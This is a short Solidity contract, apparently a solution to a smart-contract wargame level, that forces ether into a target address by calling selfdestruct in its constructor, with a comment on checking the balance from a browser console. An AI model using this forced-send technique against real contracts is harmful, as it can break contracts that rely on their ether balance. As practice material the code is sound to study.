// Check using await getBalance(instance) - Chrome Console

pragma solidity ^0.6.0;

contract ForceAttacker {
    constructor(address payable target) public payable {
        require(msg.value > 0);
        selfdestruct(target);
    }
}
